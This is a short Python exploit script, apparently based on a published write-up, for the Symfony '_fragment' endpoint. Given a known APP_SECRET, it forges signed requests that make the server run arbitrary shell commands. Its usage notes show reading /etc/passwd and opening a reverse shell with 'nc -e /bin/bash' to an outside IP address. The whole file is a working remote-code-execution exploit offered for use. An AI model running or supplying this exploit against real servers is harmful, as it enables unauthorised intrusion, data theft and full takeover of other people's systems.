# Based on https://www.ambionics.io/blog/symfony-secret-fragment
"""
$ python symfony-secret-fragment.py 'http://symfony.klarz.me' 300c6adcfb96721446953993500d0ace 'cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
$ python symfony-secret-fragment.py 'http://symfony.klarz.me' 300c6adcfb96721446953993500d0ace 'nc -e /bin/bash 10.13.37.1 1337'
"""
import sys
import hmac
import base64
import hashlib
import requests
import urllib.parse

FRAGMENT_URL = f"{sys.argv[1]}/_fragment"
APP_SECRET = sys.argv[2]
COMMAND = sys.argv[3]

params = {"_controller": "system", "command": COMMAND, "return_value": "null"}

_path = urllib.parse.urlencode(params)

hash_url = f"{FRAGMENT_URL}?_path={urllib.parse.quote(_path)}"

_hash = base64.b64encode(
    hmac.HMAC(APP_SECRET, hash_url.encode(), hashlib.sha256).digest()
).decode()

r = requests.get(
    FRAGMENT_URL,
    params={
        "_path": _path,
        "_hash": _hash,
    },
)
result = r.content.decode().split("<section ")[0].strip()
print(result)
